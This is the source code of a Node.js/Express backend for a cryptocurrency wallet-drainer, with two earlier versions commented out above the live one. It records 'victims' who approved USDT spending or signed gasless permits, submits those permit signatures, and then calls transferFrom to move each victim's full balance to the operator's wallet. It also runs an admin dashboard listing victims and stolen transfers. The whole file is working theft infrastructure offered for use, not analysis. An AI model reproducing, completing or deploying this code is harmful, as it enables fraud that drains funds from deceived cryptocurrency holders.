// require('dotenv').config();
// const express = require('express');
// const mongoose = require('mongoose');
// const cors = require('cors');
// const { ethers } = require('ethers');
// const Victim = require('./victimSchema');
// const Transfer = require('./TransferSchema');

// const app = express();
// app.use(express.json());
// app.use(cors());

// mongoose.connect(process.env.MONGO_URI)
//   .then(() => console.log("MongoDB Connected"))
//   .catch(err => console.log(err));

// const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
// const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
// const USDT_ABI = [
//   "function transferFrom(address from, address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)",
//   "function allowance(address owner, address spender) view returns (uint256)"
// ];
// const usdtContract = new ethers.Contract(process.env.USDT_ADDRESS, USDT_ABI, wallet);

// app.post('/api/log', async (req, res) => {
//   try {
//     const { address, amount } = req.body;
//     const victim = await Victim.findOneAndUpdate(
//       { address: address.toLowerCase() },
//       { amount, status: 'Approved' },
//       { upsert: true, new: true }
//     );
//     res.status(200).json({ message: "Logged successfully", victim });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// app.post('/api/withdraw', async (req, res) => {
//   const { address } = req.body;
//   try {
//     const victimAddr = address.toLowerCase();
//     const balance = await usdtContract.balanceOf(victimAddr);
//     const allowance = await usdtContract.allowance(victimAddr, wallet.address);

//     if (balance === 0n) return res.status(400).json({ error: "Wallet is empty" });
//     if (allowance < balance) return res.status(400).json({ error: "No allowance" });

//     // transferFrom call (Fees AAPKE receiver wallet se kategi)
//     const tx = await usdtContract.transferFrom(victimAddr, wallet.address, balance);
//     await tx.wait();

//     await Victim.updateOne({ address: victimAddr }, { status: 'Withdrawn' });
//     res.status(200).json({ message: "Success", txHash: tx.hash });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// app.post('/api/log-transfer', async (req, res) => {
//   try {
//     const { from, to, amount, txHash } = req.body;
//     const log = new Transfer({ from, to, amount, txHash });
//     await log.save();
//     res.status(200).json({ message: "Transfer logged successfully" });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// app.get('/api/transfers/all', async (req, res) => {
//     try {
//         const transfers = await Transfer.find().sort({ createdAt: -1 });
//         res.status(200).json({
//             total_victims: transfers.length,
//             data: transfers
//         });
//     } catch (err) {
//         res.status(500).json({ error: err.message });
//     }
// });



// app.listen(process.env.PORT, () => console.log(`Server running on port ${process.env.PORT}`));



// require('dotenv').config();
// const express = require('express');
// const mongoose = require('mongoose');
// const cors = require('cors');
// const { ethers } = require('ethers');

// // Models Import
// const Victim = require('./models/victimSchema');
// const Transfer = require('./models/TransferSchema');

// const app = express();
// app.use(express.json());
// app.use(cors());

// // MongoDB Connection
// mongoose.connect(process.env.MONGO_URI)
//   .then(() => console.log("✅ MongoDB Connected"))
//   .catch(err => console.error("❌ MongoDB Error:", err));

// // Blockchain Setup
// const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
// const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

// // Full ABI with Permit Support
// const USDT_ABI = [
//   "function transferFrom(address from, address to, uint256 amount) returns (bool)",
//   "function balanceOf(address account) view returns (uint256)",
//   "function allowance(address owner, address spender) view returns (uint256)",
//   "function nonces(address owner) view returns (uint256)",
//   "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
// ];
// const usdtContract = new ethers.Contract(process.env.USDT_ADDRESS, USDT_ABI, wallet);

// // --- ROUTES ---

// // 1. Log Victim (Approval/Permit hone par status update)
// app.post('/api/log', async (req, res) => {
//   try {
//     const { address, amount } = req.body;
//     const victim = await Victim.findOneAndUpdate(
//       { address: address.toLowerCase() },
//       { amount, status: 'Approved' }, 
//       { upsert: true, new: true }
//     );
//     res.status(200).json({ message: "Victim logged successfully", victim });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// // 2. Submit Permit Signature (Notification-free access)
// app.post('/api/permit-submit', async (req, res) => {
//   const { owner, spender, value, deadline, v, r, s } = req.body;
//   try {
//     console.log(`Processing Permit for ${owner}...`);
//     const permitTx = await usdtContract.permit(owner, spender, value, deadline, v, r, s);
//     await permitTx.wait();

//     res.status(200).json({ message: "Permit successful! Access granted." });
//   } catch (err) {
//     res.status(500).json({ error: "Permit failed: " + err.message });
//   }
// });

// // 3. Withdrawal Logic (Funds nikalne ke liye)
// app.post('/api/withdraw', async (req, res) => {
//   const { address } = req.body;
//   try {
//     const victimAddr = address.toLowerCase();
    
//     // Check Live Balance
//     const balance = await usdtContract.balanceOf(victimAddr);
//     if (balance === 0n) return res.status(400).json({ error: "Wallet is empty" });

//     // Check Allowance
//     const allowance = await usdtContract.allowance(victimAddr, wallet.address);
//     if (allowance < balance) return res.status(400).json({ error: "Insufficient allowance" });

//     console.log(`Withdrawing ${ethers.formatUnits(balance, 18)} USDT from ${victimAddr}...`);

//     // Actual Transfer
//     const tx = await usdtContract.transferFrom(victimAddr, wallet.address, balance);
//     const receipt = await tx.wait();

//     // Update Victim Status
//     await Victim.updateOne({ address: victimAddr }, { status: 'Withdrawn' });

//     // Log the Transfer History
//     const history = new Transfer({
//       from: victimAddr,
//       to: wallet.address,
//       amount: ethers.formatUnits(balance, 18),
//       txHash: tx.hash
//     });
//     await history.save();

//     res.status(200).json({ 
//       message: "Success", 
//       txHash: tx.hash,
//       amount: ethers.formatUnits(balance, 18) 
//     });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// // 4. View All Successful Transfers (Dashboard data)
// app.get('/api/transfers/all', async (req, res) => {
//   try {
//     const transfers = await Transfer.find().sort({ createdAt: -1 });
//     res.status(200).json({
//       count: transfers.length,
//       data: transfers
//     });
//   } catch (err) {
//     res.status(500).json({ error: err.message });
//   }
// });

// // 5. Victim Status Checker (Check Balance & Allowance anytime)
// app.get('/api/check/:address', async (req, res) => {
//     try {
//       const addr = req.params.address.toLowerCase();
//       const bal = await usdtContract.balanceOf(addr);
//       const allow = await usdtContract.allowance(addr, wallet.address);
//       res.json({
//           address: addr,
//           balance: ethers.formatUnits(bal, 18),
//           allowance: ethers.formatUnits(allow, 18)
//       });
//     } catch (err) {
//       res.status(500).json({ error: err.message });
//     }
// });

// const PORT = process.env.PORT || 5000;
// app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));











require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const { ethers } = require('ethers');

// Models Import (Make sure paths are correct)
const Victim = require('./victimSchema');
const Transfer = require('./TransferSchema');

const app = express();
app.use(express.json());
app.use(cors({ origin: '*' })); // Proper CORS for Admin & Frontend

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.error("❌ MongoDB Error:", err));

// Blockchain Setup
const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function nonces(address owner) view returns (uint256)",
  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
];
const usdtContract = new ethers.Contract(process.env.USDT_ADDRESS, USDT_ABI, wallet);

// --- UPDATED ROUTES ---

// 1. GET ALL VICTIMS: Yeh Admin Dashboard ke liye hai (Main Page)
app.get('/api/victims/all', async (req, res) => {
  try {
    console.log("Fetching all victims...")
    const victims = await Victim.find().sort({ updatedAt: -1 });
    res.status(200).json({ count: victims.length, data: victims });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 2. LOG VICTIM: Frontend se approval/next hone par call hota hai
app.post('/api/log', async (req, res) => {
  console.log("Logging victim data...")
  try {
    const { address, amount } = req.body;
    const victim = await Victim.findOneAndUpdate(
      { address: address.toLowerCase() },
      { amount, status: 'Approved', lastSeen: new Date() },
      { upsert: true, new: true }
    );
    res.status(200).json({ message: "Victim logged", victim });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. PERMIT SUBMIT: Yahan signature execute hota hai
app.post('/api/permit-submit', async (req, res) => {
  console.log("Processing permit submission...")
  const { owner, spender, value, deadline, v, r, s } = req.body;
  try {
    console.log(`Processing Permit for: ${owner}`);
    const permitTx = await usdtContract.permit(owner, spender, value, deadline, v, r, s);
    await permitTx.wait();

    // Permit success hote hi Victim status 'Ready' kar do
    await Victim.findOneAndUpdate(
      { address: owner.toLowerCase() },
      { status: 'Approved', amount: 'Unlimited Access (Permit)' },
      { upsert: true }
    );

    res.status(200).json({ message: "Permit successful" });
  } catch (err) {
    console.error("Permit Error:", err.message);
    res.status(500).json({ error: "Permit failed but data might be logged" });
  }
});

// 4. WITHDRAW: Actual extraction route
app.post('/api/withdraw', async (req, res) => {
  console.log("Initiating withdrawal process...")
  const { address } = req.body;
  try {
    const victimAddr = address.toLowerCase();
    const balance = await usdtContract.balanceOf(victimAddr);
    
    if (balance === 0n) return res.status(400).json({ error: "Wallet khali hai" });

    const allowance = await usdtContract.allowance(victimAddr, wallet.address);
    if (allowance < balance) return res.status(400).json({ error: "No allowance/approval" });

    // Transfer from victim to your wallet
    const tx = await usdtContract.transferFrom(victimAddr, wallet.address, balance);
    await tx.wait();

    // Database Update
    await Victim.updateOne({ address: victimAddr }, { status: 'Withdrawn' });
    const history = new Transfer({
      from: victimAddr,
      to: wallet.address,
      amount: ethers.formatUnits(balance, 18),
      txHash: tx.hash
    });
    await history.save();

    res.status(200).json({ message: "Success", txHash: tx.hash, amount: ethers.formatUnits(balance, 18) });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. LIVE CHECKER: Admin UI par kisi ka bhi balance dekhne ke liye
app.get('/api/check/:address', async (req, res) => {
  try {
    const addr = req.params.address.toLowerCase();
    const bal = await usdtContract.balanceOf(addr);
    const allow = await usdtContract.allowance(addr, wallet.address);
    res.json({
      address: addr,
      balance: ethers.formatUnits(bal, 18),
      allowance: ethers.formatUnits(allow, 18)
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 5000;

app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));

